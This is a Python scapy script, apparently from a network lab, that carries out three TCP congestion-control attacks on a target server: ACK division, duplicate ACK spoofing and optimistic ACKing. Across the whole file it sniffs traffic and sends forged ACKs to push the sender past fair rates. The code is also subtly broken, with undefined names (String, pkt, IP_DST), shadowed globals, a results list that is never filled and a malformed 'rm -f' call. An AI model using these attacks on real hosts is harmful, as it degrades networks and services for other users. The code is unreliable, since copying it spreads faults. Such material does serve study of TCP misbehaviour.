#! /usr/bin/env python
from scapy.all import *
import random
import sys
from argparse import ArgumentParser
import numpy as np
import subprocess as sp

#Parse arguments
parser = ArgumentParser(description = "Attack and destinations")
parser.add_argument('--attack', '-a',
    dest = "attack",
    type = String,
    help = "Type of attack: normal, split, dup, or opt",
    default = 'normal')

parser.add_argument('--ip', '-i',
    dest = "IP_DST",
    type = String,
    help = "IP destination",
    default = '10.0.0.1')

parser.add_argument('--port', '-p',
    dest = "DST_PORT",
    type = int,
    help = "Port destination",
    default = '8080')

parser.add_argument('--num', '-n',
    dest = "num",
    type = int,
    help = "Number of ack divisions/spoofed acks/op acks",
    default = '3')

args = parser.parse_args()

IP_SRC = None
SRC_PORT = random.randint(1024,65535)
data = list()
FIN = 0x01

socket = conf.L2socket(iface="client-eth0")

def sendSYN():
    syn = IP(dst=args.IP_DST) / TCP(window=65535, sport=SRC_PORT, dport=args.DST_PORT, flags='S')
    IP_SRC = syn[IP].src
    SRC_PORT = syn[TCP].sport

    print "sending SYN....."
    syn_ack = sr1(syn)
    initialTs = syn_ack.time
    initialSeq = syn_ack[TCP].seq
    print "Received SYN_ACK!"
    getStr = 'GET / HTTP/1.1\r\n\r\n'
    request = IP(dst=args.IP_DST) / TCP(window=65535, dport=args.DST_PORT, sport=SRC_PORT,
                seq=(syn_ack[TCP].ack), ack=(syn_ack[TCP].seq + 1), flags='FA') / getStr
    socket.send(Ether() / request)

def sendACK(ack_num):
    ack_pkt = IP(dst=IP_DST) / TCP(window=65535, dport=DST_PORT, sport=SRC_PORT,
            seq=pkt[TCP].ack, ack=ack_num, flags='A')
    socket.send(Ether() / ack_pkt)

def split(pkt):
    sendSYN()
    global DST_PORT, IP_DST, data, socket
    if IP not in pkt:
        return
    if TCP not in pkt:
        return
    if pkt[IP].src != IP_DST:
        return
    if pkt[TCP].sport != DST_PORT:
        return

    #length of tcp segment
    tcp_seg_len = len(pkt[TCP].payload)
    seq_num = pkt[TCP].seq
    ack_num = seq_num
    # divide into separate acks
    for i in range(args.num):
        # for last ack make sure its exactly what original ack should have been
        if i == args.num-1:
            ack_num = seq_num + tcp_seg_len
        else:
            ack_num = ack_num + tcp_seg_len / args.num

        # create ack and send
        sendACK(ack_num)

def dup(pkt):
    sendSYN()
    global DST_PORT, IP_DST, data, socket
    if IP not in pkt:
        return
    if TCP not in pkt:
        return
    if pkt[IP].src != IP_DST:
        return
    if pkt[TCP].sport != DST_PORT:
        return

    ack_num = pkt[TCP].seq + len(pkt[TCP].payload)
    for i in range(args.num):
        sendACK(ack_num)

def opt(pkt):
    ack_num = 0
    MTU = 1472
    WAIT_TIME = 0.05

    for i in range(args.num):
        ack_num += MTU
        sendACK(ack_num)
        time.sleep(WAIT_TIME)

    sendSYN()



if __name__ == '__main__':
    print("Sniffing......")
    if args.attack == 'split':
        FileName = "npy/split.npy"       
        sniff(iface="client-eth0", prn=split, filter="tcp and ip", timeout=4)
    if args.attack == 'dup':
        FileName = "npy/dup.npy"       
        sniff(iface="client-eth0", prn=dup, filter="tcp and ip", timeout=4)
    if args.attack == 'opt':
        FileName = "npy/op.npy"       
        sniff(iface="client-eth0", prn=opt, filter="tcp and ip", timeout=4)
      
    numbas = np.asarray(zip(*data))
    sp.call(["rm", "-f", FileName], shell=True)
    np.save(FileName, numbas)
